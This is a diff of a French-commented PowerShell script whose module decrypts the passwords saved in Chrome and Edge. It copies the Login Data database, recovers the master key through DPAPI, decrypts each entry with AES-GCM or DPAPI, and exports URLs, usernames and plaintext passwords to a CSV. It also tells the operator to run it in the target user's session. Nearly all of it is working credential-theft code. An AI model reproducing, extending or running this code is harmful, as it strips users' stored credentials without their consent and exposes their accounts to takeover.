@@ -169,25 +169,33 @@ function Export-BrowserPasswords {
 
 
 # ==============================================================================
-# MODULE 2.5 — DÉCHIFFREMENT AUTOMATIQUE (AES-GCM + Détection Version)
+# MODULE 2.5 — DÉCHIFFREMENT AUTOMATIQUE (compatible PS5.1 / PS7+)
 # ==============================================================================
-Add-Type -AssemblyName System.Security.Cryptography
-
-function Decrypt-AesGcm($encryptedBytes, $masterKey) {
-    if ($encryptedBytes.Length -lt 31) { return "[BLOB_TROP_COURT]" }
-    $iv = $encryptedBytes[3..14]
-    $cipher = $encryptedBytes[15..($encryptedBytes.Length - 17)]
-    $tag = $encryptedBytes[($encryptedBytes.Length - 16)..($encryptedBytes.Length - 1)]
-
-    $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
-    $dec = [byte[]]::new($cipher.Length)
-    $aes.Decrypt($iv, $cipher, $tag, $dec)
-    return [System.Text.Encoding]::UTF8.GetString($dec)
-}
 
 function Decrypt-BrowserPasswords {
     Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT AUTOMATIQUE CHROME/EDGE ===" -ForegroundColor Cyan
 
+    # Vérifier la présence de l'assembly System.Security (nécessaire pour ProtectedData)
+    try {
+        Add-Type -AssemblyName System.Security -ErrorAction Stop
+    } catch {
+        Write-Host "[ERREUR] Impossible de charger System.Security. Arrêt du module." -ForegroundColor Red
+        return
+    }
+
+    # Vérifier si AesGcm est disponible (PS7+ uniquement)
+    $aesGcmAvailable = $true
+    try {
+        [System.Security.Cryptography.AesGcm]::new([byte[]]::new(32)) | Out-Null
+    } catch {
+        $aesGcmAvailable = $false
+        Write-Host "[AVERTISSEMENT] AesGcm non disponible (PowerShell 5.1)." -ForegroundColor DarkYellow
+        Write-Host "Seuls les mots de passe au format DPAPI (anciens) pourront être déchiffrés." -ForegroundColor DarkYellow
+        Write-Host "Pour déchiffrer les mots de passe modernes (AES-GCM), installez PowerShell 7+ :" -ForegroundColor DarkYellow
+        Write-Host "https://aka.ms/powershell" -ForegroundColor Cyan
+    }
+
+    # Demander le navigateur
     Write-Host "1. Chrome`n2. Edge"
     $choice = Read-Host "Choix"
 
@@ -202,10 +210,10 @@ function Decrypt-BrowserPasswords {
         return
     }
 
+    # Lister les profils
     $profiles = Get-ChildItem $basePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
     Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
     $list = @()
-
     for ($i = 0; $i -lt $profiles.Count; $i++) {
         $p = $profiles[$i]
         $displayName = $p.Name
@@ -235,25 +243,29 @@ function Decrypt-BrowserPasswords {
     $outputCsv = "$ExportFolder\${browser}_Passwords_Decrypted_${Date}.csv"
 
     try {
-        # Récupération Master Key
+        # Récupération de la Master Key (si AES-GCM)
         $masterKey = $null
-        if (Test-Path $localStatePath) {
+        if ($aesGcmAvailable -and (Test-Path $localStatePath)) {
             $localState = Get-Content $localStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
             if ($localState.os_crypt.encrypted_key) {
                 $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+                # Enlève le préfixe "DPAPI" (5 premiers octets)
                 $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
-                Write-Host "✓ Mode AES-GCM (moderne) activé" -ForegroundColor Green
+                Write-Host "✓ Master key récupérée (AES-GCM)" -ForegroundColor Green
             }
+        } elseif (-not $aesGcmAvailable) {
+            Write-Host "AES-GCM non disponible : seuls les anciens mots de passe (DPAPI) seront déchiffrés." -ForegroundColor DarkYellow
         }
 
-        # Extraction avec sqlite3
+        # Copie temporaire de la base SQLite
         $tempDb = "$env:TEMP\LoginData_$(Get-Random).db"
         Copy-Item $loginDb $tempDb -Force
 
+        # Vérifier sqlite3.exe
         $sqlite = Get-Command sqlite3.exe -ErrorAction SilentlyContinue
         if (-not $sqlite) {
             Write-Host "[ERREUR] sqlite3.exe non trouvé !" -ForegroundColor Red
-            Write-Host "Télécharge-le sur https://sqlite.org/download.html" -ForegroundColor Yellow
+            Write-Host "Téléchargez-le depuis https://sqlite.org/download.html" -ForegroundColor Yellow
             return
         }
 
@@ -261,7 +273,6 @@ function Decrypt-BrowserPasswords {
         $rows = & sqlite3.exe $tempDb $query 2>$null
 
         $results = @()
-        Add-Type -AssemblyName System.Security
 
         foreach ($row in $rows) {
             $f = $row -split '\|'
@@ -272,17 +283,23 @@ function Decrypt-BrowserPasswords {
                 $password = "[ERREUR_DECHIFFREMENT]"
 
                 try {
+                    # Convertir la chaîne hexadécimale en bytes
                     $encBytes = [byte[]]::new($encHex.Length / 2)
                     for ($j = 0; $j -lt $encHex.Length; $j += 2) {
                         $encBytes[$j/2] = [Convert]::ToByte($encHex.Substring($j, 2), 16)
                     }
 
-                    if ($masterKey) {
+                    # Tentative de déchiffrement selon le format
+                    if ($masterKey -and $aesGcmAvailable) {
+                        # Format AES-GCM (Chrome >= 80, Edge Chromium)
                         $password = Decrypt-AesGcm $encBytes $masterKey
                     } else {
+                        # Ancien format DPAPI
                         $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, 'CurrentUser'))
                     }
-                } catch { }
+                } catch {
+                    # Échec : on laisse le message d'erreur
+                }
 
                 $results += [PSCustomObject]@{ URL = $url; Username = $user; Password = $password }
             }
@@ -292,7 +309,7 @@ function Decrypt-BrowserPasswords {
 
         if ($results.Count -gt 0) {
             $results | Export-Csv -Path $outputCsv -Encoding UTF8 -NoTypeInformation
-            Write-Host "`n✓ $($results.Count) mots de passe déchiffrés avec succès !" -ForegroundColor Green
+            Write-Host "`n✓ $($results.Count) mots de passe traités (déchiffrés si possible) !" -ForegroundColor Green
             Write-Host "Fichier : $outputCsv" -ForegroundColor Green
         } else {
             Write-Host "Aucun mot de passe trouvé." -ForegroundColor Yellow
@@ -300,10 +317,28 @@ function Decrypt-BrowserPasswords {
     }
     catch {
         Write-Host "[ERREUR] $_" -ForegroundColor Red
-        Write-Host "→ Exécute ce module dans la session de l'utilisateur cible" -ForegroundColor DarkYellow
+        Write-Host "→ Assurez-vous d'exécuter ce script dans la session de l'utilisateur cible." -ForegroundColor DarkYellow
     }
 }
 
+# Fonction de déchiffrement AES-GCM (ne fonctionne que sous PS7+)
+function Decrypt-AesGcm($encryptedBytes, $masterKey) {
+    # Structure d'un blob AES-GCM de Chrome/Edge :
+    # - octet 0 : version (0x76 = 'v')
+    # - octets 1-2 : non utilisé ? 
+    # - octets 3-14 : IV (12 octets)
+    # - octets 15..(len-17) : ciphertext
+    # - derniers 16 octets : tag
+    if ($encryptedBytes.Length -lt 31) { return "[BLOB_TROP_COURT]" }
+    $iv = $encryptedBytes[3..14]
+    $cipher = $encryptedBytes[15..($encryptedBytes.Length - 17)]
+    $tag = $encryptedBytes[($encryptedBytes.Length - 16)..($encryptedBytes.Length - 1)]
+
+    $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
+    $dec = [byte[]]::new($cipher.Length)
+    $aes.Decrypt($iv, $cipher, $tag, $dec)
+    return [System.Text.Encoding]::UTF8.GetString($dec)
+}
 
 # ==============================================================================
 # MODULE 3 — BLOCAGE PARTAGE CONNEXION (Version Prof complète)
